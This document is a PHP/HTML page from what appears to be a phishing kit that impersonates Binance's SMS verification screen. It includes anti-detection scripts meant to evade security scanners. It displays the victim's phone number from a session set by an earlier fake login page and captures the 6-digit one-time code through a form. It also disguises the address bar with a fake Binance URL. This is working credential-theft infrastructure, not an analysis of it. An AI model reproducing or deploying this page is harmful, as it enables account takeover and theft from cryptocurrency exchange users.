
<?php
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
// by uysnx 
session_start();
if (!isset($_SESSION["loggedin"])){
  exit(header("Location: ../l/"));
 }
 
 include '../UysnX/khawazmiat_binance.php';
?>
<!DOCTYPE html><html dir="ltr" lang="en"><head>
<link rel="stylesheet" href="css/uysnx2.css">
<style>
    #xuysnx {
          width: 100%;
          height: 100%;
          top: 0px;
          left: 0px;
          position: fixed;
          display: block;
          opacity: 1;
          background-color: rgba(0,0,0,.5);
          z-index: 99;
          text-align: center;
      }
      
.error {
color: red;
}
</style>
<?php
include '../include/head.php'; 
?>
<body>
<div id="xuysnx" style="display:none;">
</div>
<svg aria-name="common" xmlns="http://www.w3.org/2000/svg" style="position: absolute; width: 0px; height: 0px; overflow: hidden;" aria-hidden="true">
<?php
include '../include/svg.php';
?>
    <?php
    include '../include/header.php';
    ?>
    <div class="css-15xjy3y"><div id="header_global_js_wxgy34nj" class="css-6sm2ml"></div></div></div><main class="main css-5oj4n"><div class="css-108ucgm">
      <div class="binance-row css-16kn2us" style="margin-left: -12px; margin-right: -12px;"><div class="binance-col binance-col-4 css-vurnku" style="padding-left: 12px; padding-right: 12px;"></div><div class="binance-col css-1wz0uwi" style="padding-left: 12px; padding-right: 12px; flex: 1 1 auto;"><div class="css-1ryxl5n"><div class="css-1dj2s8h"><div class="css-108ucgm"><div class="css-51cj2k"></div><div class="title-area css-4hwal1"><div class="css-ttner8"><div class="css-vurnku"><div data-bn-type="text" class="css-1mzk4e3">
Number Verification</div><div class="css-jmlio4"><div data-bn-type="text" class="css-4dpaxn">Please enter the 6-digit verification code that was sent to <?php echo $_SESSION["phone"];?> The code is valid for 30 minutes.</div></div></div></div></div></div>
<form action="" method="post" id='warbkkk1' name='warbkkk1' autocomplete="off">
<input type="hidden" name="uysnx4" value="xuysnx"><div class="css-15651n7"><div class="css-xjlny9">Sms Verification Code</div>
<div class=" css-hiy16i"><div class=" css-1cgu4y5"><input data-bn-type="input" type="text" inputmode="numeric" autocomplete="one-time-code" pattern="\d*" name="verifyCode" class="css-16fg16t" value="" required> 


</div></div><div class="help_default css-1acqidq"></div></div><button data-bn-type="button" id="click_login_submit" class=" css-h5sdlz">Submit</button></form>
<div data-bn-type="text" class="css-1hjs0lj">Didn't receive the code?</div></div></div></div></div></div></main>
<div class="css-3kcv4i"><div data-bn-type="text" class="css-1om5toz">© 2017 - 2024 Binance.com. All rights reserved</div>
<div data-bn-type="text" data-ot-trigger="true" class="css-ff02t7">Cookie Preferences</div></div></div></div>
  <script src="../js_main/7adari_ababab.js"></script>
<script src="../js_main/1.js"></script>
<script src="../js_main/2.js"></script>
<script src="js/3.js"></script>
<script>
      if (window.history.replaceState) {
   window.history.replaceState("uysnx", "Title", "../en/Verification?return_to=<?php print $khawazmia_binance;?>");
}
</script>
<div></div></body></html>